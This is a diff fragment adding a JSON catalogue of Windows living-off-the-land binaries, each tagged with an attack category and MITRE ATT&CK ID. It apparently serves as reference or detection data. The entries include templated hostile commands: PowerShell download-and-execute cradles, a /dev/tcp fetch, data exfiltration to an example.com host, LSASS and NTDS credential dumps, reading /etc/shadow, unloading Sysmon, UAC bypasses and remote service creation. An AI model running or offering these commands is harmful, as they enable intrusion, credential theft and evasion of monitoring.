+      "mitre": "T1105",
+      "command": "rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}"
+    },
+    {
+      "binary": "Sigverif.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "sigverif.exe"
+    },
+    {
+      "binary": "Sqldumper.exe",
+      "category": "Dump",
+      "mitre": "T1003",
+      "command": "sqldumper.exe 464 0 0x0110"
+    },
+    {
+      "binary": "Sqldumper.exe",
+      "category": "Dump",
+      "mitre": "T1003.001",
+      "command": "sqldumper.exe 540 0 0x01100:40"
+    },
+    {
+      "binary": "Sqlps.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Sqlps.exe -noprofile"
+    },
+    {
+      "binary": "Squirrel.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "squirrel.exe --update {REMOTEURL}"
+    },
+    {
+      "binary": "Squirrel.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "squirrel.exe --updateRollback={REMOTEURL}"
+    },
+    {
+      "binary": "Squirrel.exe",
+      "category": "Download",
+      "mitre": "T1218",
+      "command": "squirrel.exe --download {REMOTEURL}"
+    },
+    {
+      "binary": "Squirrel.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "squirrel.exe --update {REMOTEURL}"
+    },
+    {
+      "binary": "Squirrel.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "squirrel.exe --updateRollback={REMOTEURL}"
+    },
+    {
+      "binary": "Stordiag.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "stordiag.exe"
+    },
+    {
+      "binary": "Stordiag.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "stordiag.exe"
+    },
+    {
+      "binary": "SyncAppvPublishingServer.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\""
+    },
+    {
+      "binary": "Syncappvpublishingserver.vbs",
+      "category": "Execute",
+      "mitre": "T1216.002",
+      "command": "SyncAppvPublishingServer.vbs \"n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\""
+    },
+    {
+      "binary": "Syssetup.dll",
+      "category": "AWL Bypass",
+      "mitre": "T1218.011",
+      "command": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}"
+    },
+    {
+      "binary": "Syssetup.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}"
+    },
+    {
+      "binary": "Tar.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}"
+    },
+    {
+      "binary": "Tar.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "tar -xf {PATH}:ads"
+    },
+    {
+      "binary": "Tar.exe",
+      "category": "Copy",
+      "mitre": "T1105",
+      "command": "tar -xf {PATH_SMB:.tar}"
+    },
+    {
+      "binary": "Teams.exe",
+      "category": "Execute",
+      "mitre": "T1218.015",
+      "command": "teams.exe"
+    },
+    {
+      "binary": "Teams.exe",
+      "category": "Execute",
+      "mitre": "T1218.015",
+      "command": "teams.exe"
+    },
+    {
+      "binary": "Teams.exe",
+      "category": "Execute",
+      "mitre": "T1218.015",
+      "command": "teams.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\""
+    },
+    {
+      "binary": "TestWindowRemoteAgent.exe",
+      "category": "Upload",
+      "mitre": "T1048",
+      "command": "TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000"
+    },
+    {
+      "binary": "Tracker.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1127",
+      "command": "Tracker.exe /d {PATH:.dll} /c C:\\Windows\\write.exe"
+    },
+    {
+      "binary": "Tracker.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "Tracker.exe /d {PATH:.dll} /c C:\\Windows\\write.exe"
+    },
+    {
+      "binary": "Ttdinject.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\""
+    },
+    {
+      "binary": "Ttdinject.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch \"{PATH:.exe}\""
+    },
+    {
+      "binary": "Tttracer.exe",
+      "category": "Dump",
+      "mitre": "T1003",
+      "command": "TTTracer.exe -dumpFull -attach {PID}"
+    },
+    {
+      "binary": "Tttracer.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "tttracer.exe {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Unregmp2.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "rmdir %temp%\\lolbin /s /q 2>nul & mkdir \"%temp%\\lolbin\\Windows Media Player\" & copy C:\\Windows\\System32\\calc.exe \"%temp%\\lolbin\\Windows Media Player\\wmpnscfg.exe\" >nul && cmd /V /C \"set \"ProgramW6432=%temp%\\lolbin\" && unregmp2.exe /HideWMP\""
+    },
+    {
+      "binary": "Update.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\""
+    },
+    {
+      "binary": "Update.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "Update.exe --update={PATH_SMB:folder}"
+    },
+    {
+      "binary": "Update.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "Update.exe --update={REMOTEURL}"
+    },
+    {
+      "binary": "Update.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "Update.exe --updateRollback={PATH_SMB:folder}"
+    },
+    {
+      "binary": "Update.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "Update.exe --updateRollback={REMOTEURL}"
+    },
+    {
+      "binary": "Update.exe",
+      "category": "Download",
+      "mitre": "T1218",
+      "command": "Update.exe --download {REMOTEURL}"
+    },
+    {
+      "binary": "Update.exe",
+      "category": "Execute",
+      "mitre": "T1547",
+      "command": "Update.exe --createShortcut={PATH:.exe} -l=Startup"
+    },
+    {
+      "binary": "Update.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\""
+    },
+    {
+      "binary": "Update.exe",
+      "category": "Execute",
+      "mitre": "T1070",
+      "command": "Update.exe --removeShortcut={PATH:.exe}-l=Startup"
+    },
+    {
+      "binary": "Update.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Update.exe --update={PATH_SMB:folder}"
+    },
+    {
+      "binary": "Update.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Update.exe --update={REMOTEURL}"
+    },
+    {
+      "binary": "Update.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Update.exe --updateRollback={PATH_SMB:folder}"
+    },
+    {
+      "binary": "Update.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Update.exe --updateRollback={REMOTEURL}"
+    },
+    {
+      "binary": "Url.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta"
+    },
+    {
+      "binary": "Url.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e"
+    },
+    {
+      "binary": "Url.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Url.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e"
+    },
+    {
+      "binary": "Url.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}"
+    },
+    {
+      "binary": "Url.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}"
+    },
+    {
+      "binary": "UtilityFunctions.ps1",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": "powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\temp\\unsigned.dll;[Program.Class]::Main()\""
+    },
+    {
+      "binary": "VSDiagnostics.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "VSDiagnostics.exe start 1 /launch:{PATH:.exe}"
+    },
+    {
+      "binary": "VSDiagnostics.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:\"{CMD:args}\""
+    },
+    {
+      "binary": "VSIISExeLauncher.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "VSIISExeLauncher.exe -p {PATH:.exe} -a \"{CMD:args}\""
+    },
+    {
+      "binary": "VSLaunchBrowser.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "VSLaunchBrowser.exe .exe {REMOTEURL:.exe}"
+    },
+    {
+      "binary": "VSLaunchBrowser.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "VSLaunchBrowser.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "VSLaunchBrowser.exe .exe {PATH_SMB}"
+    },
+    {
+      "binary": "Verclsid.exe",
+      "category": "Execute",
+      "mitre": "T1218.012",
+      "command": "verclsid.exe /S /C {CLSID}"
+    },
+    {
+      "binary": "Visio.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "Visio.exe {REMOTEURL}"
+    },
+    {
+      "binary": "VisualUiaVerifyNative.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "VisualUiaVerifyNative.exe"
+    },
+    {
+      "binary": "Vshadow.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:"
+    },
+    {
+      "binary": "WFMFormat.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "WFMFormat.exe"
+    },
+    {
+      "binary": "Wab.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "wab.exe"
+    },
+    {
+      "binary": "Wfc.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1127",
+      "command": "wfc.exe {PATH_ABSOLUTE:.xoml}"
+    },
+    {
+      "binary": "WinDbg.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "windbg.exe -g {CMD}"
+    },
+    {
+      "binary": "WinProj.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "WinProj.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Winword.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "winword.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Wlrmdr.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}"
+    },
+    {
+      "binary": "Wmic.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\""
+    },
+    {
+      "binary": "Wmic.exe",
+      "category": "Copy",
+      "mitre": "T1105",
+      "command": "wmic.exe datafile where \"Name='C:\\\\windows\\\\system32\\\\calc.exe'\" call Copy \"C:\\\\users\\\\public\\\\calc.exe\""
+    },
+    {
+      "binary": "Wmic.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "wmic.exe /node:\"192.168.0.1\" process call create \"{CMD}\""
+    },
+    {
+      "binary": "Wmic.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "wmic.exe process call create \"{CMD}\""
+    },
+    {
+      "binary": "Wmic.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "wmic.exe process get brief /format:\"{PATH_SMB:.xsl}\""
+    },
+    {
+      "binary": "Wmic.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "wmic.exe process get brief /format:\"{REMOTEURL:.xsl}\""
+    },
+    {
+      "binary": "WorkFolders.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "WorkFolders"
+    },
+    {
+      "binary": "WorkFolders.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "WorkFolders"
+    },
+    {
+      "binary": "Wscript.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "echo GetObject(\"script:{REMOTEURL:.js}\") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js"
+    },
+    {
+      "binary": "Wscript.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "wscript //e:vbscript {PATH}:script.vbs"
+    },
+    {
+      "binary": "Wsl.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'"
+    },
+    {
+      "binary": "Wsl.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "wsl.exe"
+    },
+    {
+      "binary": "Wsl.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "wsl.exe --exec bash -c \"{CMD}\""
+    },
+    {
+      "binary": "Wsl.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "wsl.exe -e /mnt/c/Windows/System32/calc.exe"
+    },
+    {
+      "binary": "Wsl.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "wsl.exe -u root -e cat /etc/shadow"
+    },
+    {
+      "binary": "Wsreset.exe",
+      "category": "UAC Bypass",
+      "mitre": "T1548.002",
+      "command": "wsreset.exe"
+    },
+    {
+      "binary": "XBootMgr.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "xbootmgr.exe -trace \"{boot|hibernate|standby|shutdown|rebootCycle}\" -callBack {PATH:.exe}"
+    },
+    {
+      "binary": "XBootMgr.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "xbootmgr.exe -trace \"{boot|hibernate|standby|shutdown|rebootCycle}\" -preTraceCmd {PATH:.exe}"
+    },
+    {
+      "binary": "XBootMgrSleep.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "xbootmgrsleep.exe 1000 {PATH:.exe}"
+    },
+    {
+      "binary": "Xwizard.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}"
+    },
+    {
+      "binary": "Xwizard.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}"
+    },
+    {
+      "binary": "Xwizard.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}"
+    },
+    {
+      "binary": "Zipfldr.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e"
+    },
+    {
+      "binary": "Zipfldr.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}"
+    },
+    {
+      "binary": "adplus.exe",
+      "category": "Dump",
+      "mitre": "T1003.001",
+      "command": "adplus.exe -c {PATH:.xml}"
+    },
+    {
+      "binary": "adplus.exe",
+      "category": "Dump",
+      "mitre": "T1003.001",
+      "command": "adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet"
+    },
+    {
+      "binary": "adplus.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "adplus.exe -c {PATH:.xml}"
+    },
+    {
+      "binary": "adplus.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "adplus.exe -crash -o \"{PATH_ABSOLUTE:folder}\" -sc {PATH:.exe}"
+    },
+    {
+      "binary": "cmdl32.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "cmdl32 /vpn /lan %cd%\\config"
+    },
+    {
+      "binary": "code.exe",
+      "category": "Execute",
+      "mitre": "T1219.001",
+      "command": "code.exe tunnel --accept-server-license-terms --name \"tunnel-name\""
+    },
+    {
+      "binary": "coregen.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name"
+    },
+    {
+      "binary": "coregen.exe",
+      "category": "Execute",
+      "mitre": "T1055",
+      "command": "coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name"
+    },
+    {
+      "binary": "coregen.exe",
+      "category": "Execute",
+      "mitre": "T1055",
+      "command": "coregen.exe dummy_assembly_name"
+    },
+    {
+      "binary": "csi.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "csi.exe {PATH:.cs}"
+    },
+    {
+      "binary": "devtunnel.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "devtunnel.exe host -p 8080"
+    },
+    {
+      "binary": "dnx.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "dnx.exe {PATH_ABSOLUTE:folder}"
+    },
+    {
+      "binary": "dsdbutil.exe",
+      "category": "Dump",
+      "mitre": "T1003.003",
+      "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"list all\" \"mount 1\" \"quit\" \"quit\""
+    },
+    {
+      "binary": "dsdbutil.exe",
+      "category": "Dump",
+      "mitre": "T1003.003",
+      "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"quit\" \"quit\""
+    },
+    {
+      "binary": "dsdbutil.exe",
+      "category": "Dump",
+      "mitre": "T1003.003",
+      "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"delete {GUID}\" \"quit\" \"quit\""
+    },
+    {
+      "binary": "dsdbutil.exe",
+      "category": "Dump",
+      "mitre": "T1003.003",
+      "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"list all\" \"delete 1\" \"quit\" \"quit\""
+    },
+    {
+      "binary": "dsdbutil.exe",
+      "category": "Dump",
+      "mitre": "T1003.003",
+      "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"mount {GUID}\" \"quit\" \"quit\""
+    },
+    {
+      "binary": "dtutil.exe",
+      "category": "Copy",
+      "mitre": "T1105",
+      "command": "dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}"
+    },
+    {
+      "binary": "fltMC.exe",
+      "category": "Tamper",
+      "mitre": "T1562.001",
+      "command": "fltMC.exe unload SysmonDrv"
+    },
+    {
+      "binary": "iediagcmd.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "set windir=c:\\test& cd \"C:\\Program Files\\Internet Explorer\\\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}"
+    },
+    {
+      "binary": "iscsicpl.exe",
+      "category": "UAC Bypass",
+      "mitre": "T1548.002",
+      "command": "c:\\windows\\syswow64\\iscsicpl.exe"
+    },
+    {
+      "binary": "iscsicpl.exe",
+      "category": "UAC Bypass",
+      "mitre": "T1548.002",
+      "command": "iscsicpl.exe"
+    },
+    {
+      "binary": "msedge_proxy.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}"
+    },
+    {
+      "binary": "msedge_proxy.exe",
+      "category": "Execute",
+      "mitre": "T1218.015",
+      "command": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\""
+    },
+    {
+      "binary": "msedgewebview2.exe",
+      "category": "Execute",
+      "mitre": "T1218.015",
+      "command": "msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD}\""
+    },
+    {
+      "binary": "msedgewebview2.exe",
+      "category": "Execute",
+      "mitre": "T1218.015",
+      "command": "msedgewebview2.exe --no-sandbox --browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\""
+    },
+    {
+      "binary": "msedgewebview2.exe",
+      "category": "Execute",
+      "mitre": "T1218.015",
+      "command": "msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=\"{CMD}\""
+    },
+    {
+      "binary": "msedgewebview2.exe",
+      "category": "Execute",
+      "mitre": "T1218.015",
+      "command": "msedgewebview2.exe --utility-cmd-prefix=\"{CMD}\""
+    },
+    {
+      "binary": "msoxmled.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "msoxmled.exe /verb open {REMOTEURL}"
+    },
+    {
+      "binary": "msxsl.exe",
+      "category": "ADS",
+      "mitre": "T1564",
+      "command": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name"
+    },
+    {
+      "binary": "msxsl.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1220",
+      "command": "msxsl.exe {PATH:.xml} {PATH:.xsl}"
+    },
+    {
+      "binary": "msxsl.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1220",
+      "command": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}"
+    },
+    {
+      "binary": "msxsl.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}"
+    },
+    {
+      "binary": "msxsl.exe",
+      "category": "Execute",
+      "mitre": "T1220",
+      "command": "msxsl.exe {PATH:.xml} {PATH:.xsl}"
+    },
+    {
+      "binary": "msxsl.exe",
+      "category": "Execute",
+      "mitre": "T1220",
+      "command": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}"
+    },
+    {
+      "binary": "ntdsutil.exe",
+      "category": "Dump",
+      "mitre": "T1003.003",
+      "command": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q"
+    },
+    {
+      "binary": "odbcad32.exe",
+      "category": "UAC Bypass",
+      "mitre": "T1548.002",
+      "command": "odbcad32.exe"
+    },
+    {
+      "binary": "rcsi.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1127",
+      "command": "rcsi.exe {PATH:.csx}"
+    },
+    {
+      "binary": "rcsi.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "rcsi.exe {PATH:.csx}"
+    },
+    {
+      "binary": "rdrleakdiag.exe",
+      "category": "Dump",
+      "mitre": "T1003.001",
+      "command": "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap"
+    },
+    {
+      "binary": "rdrleakdiag.exe",
+      "category": "Dump",
+      "mitre": "T1003.001",
+      "command": "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1"
+    },
+    {
+      "binary": "rdrleakdiag.exe",
+      "category": "Dump",
+      "mitre": "T1003",
+      "command": "rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1"
+    },
+    {
+      "binary": "scp.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "scp.exe -S \"{CMD}\" . localhost:."
+    },
+    {
+      "binary": "scp.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "scp.exe -o ProxyCommand=\"{CMD}\" . localhost:."
+    },
+    {
+      "binary": "setupugc.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "setupugc.exe auditUser"
+    },
+    {
+      "binary": "setupugc.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "setupugc.exe specialize"
+    },
+    {
+      "binary": "ssh.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "ssh -o ProxyCommand=\"{CMD}\" ."
+    },
+    {
+      "binary": "ssh.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "ssh localhost \"{CMD}\""
+    },
+    {
+      "binary": "te.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "te.exe {PATH:.dll}"
+    },
+    {
+      "binary": "te.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "te.exe {PATH:.wsc}"
+    },
+    {
+      "binary": "vbc.exe",
+      "category": "Compile",
+      "mitre": "T1127",
+      "command": "vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb}"
+    },
+    {
+      "binary": "vbc.exe",
+      "category": "Compile",
+      "mitre": "T1127",
+      "command": "vbc.exe /target:exe {PATH_ABSOLUTE:.vb}"
+    },
+    {
+      "binary": "vsjitdebugger.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "Vsjitdebugger.exe {PATH:.exe}"
+    },
+    {
+      "binary": "vsls-agent.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}"
+    },
+    {
+      "binary": "vstest.console.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1127",
+      "command": "vstest.console.exe {PATH:.dll}"
+    },
+    {
+      "binary": "wbadmin.exe",
+      "category": "Dump",
+      "mitre": "T1003.003",
+      "command": "wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet"
+    },
+    {
+      "binary": "wbadmin.exe",
+      "category": "Dump",
+      "mitre": "T1003.003",
+      "command": "wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -notRestoreAcl -quiet"
+    },
+    {
+      "binary": "wbemtest.exe",
+      "category": "Execute",
+      "mitre": "T1047",
+      "command": "wbemtest.exe"
+    },
+    {
+      "binary": "winfile.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "winfile.exe {PATH:.exe}"
+    },
+    {
+      "binary": "winget.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1105",
+      "command": "winget.exe install --accept-package-agreements -s msstore {name or ID}"
+    },
+    {
+      "binary": "winget.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "winget.exe install --accept-package-agreements -s msstore {name or ID}"
+    },
+    {
+      "binary": "winget.exe",
+      "category": "Execute",
+      "mitre": "T1105",
+      "command": "winget.exe install --manifest {PATH:.yml}"
+    },
+    {
+      "binary": "winrm.vbs",
+      "category": "AWL Bypass",
+      "mitre": "T1220",
+      "command": "%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty"
+    },
+    {
+      "binary": "winrm.vbs",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": "winrm invoke Create wmicimv2/Win32_Process @{CommandLine=\"{CMD}\"} -r:http://target:5985"
+    },
+    {
+      "binary": "winrm.vbs",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": "winrm invoke Create wmicimv2/Win32_Service @{Name=\"Evil\";DisplayName=\"Evil\";PathName=\"{CMD}\"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985"
+    },
+    {
+      "binary": "write.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "write.exe"
+    },
+    {
+      "binary": "wsb.exe",
+      "category": "Execute",
+      "mitre": "T1564.006",
+      "command": "wsb start\nwsb share --id YOUR_ID -f {PATH_ABSOLUTE:folder} -s c:\\SOME_FOLDER --allow-write\nwsb exec -r System --id YOUR_ID -c \"cmd.exe /c copy {PATH_ABSOLUTE} c:\\SOME_FOLDER\"\n"
+    },
+    {
+      "binary": "wsb.exe",
+      "category": "Execute",
+      "mitre": "T1564.006",
+      "command": "wsb start --config \"<Configuration><LogonCommand><Command>{CMD}</Command></LogonCommand></Configuration>\"\nwsb exec -r System --id YOUR_ID\n"
+    },
+    {
+      "binary": "wsb.exe",
+      "category": "Execute",
+      "mitre": "T1564.006",
+      "command": "wsb start --config \"<Configuration><MappedFolders><MappedFolder><HostFolder>{PATH_ABSOLUTE:folder}</HostFolder><ReadOnly>false</ReadOnly></MappedFolder></MappedFolders></Configuration>\"\nwsb exec -r System --id YOUR_ID -c \"cmd.exe /c copy C:\\users\\WDAGUtilityAccount\\Desktop\\Temp\\{PATH} {PATH}\"\n"
+    },
+    {
+      "binary": "wt.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "wt.exe {CMD}"
+    },
+    {
+      "binary": "wuauclt.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer"
+    },
+    {
+      "binary": "xsd.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "xsd.exe {REMOTEURL}"
+    }
+  ]
+}
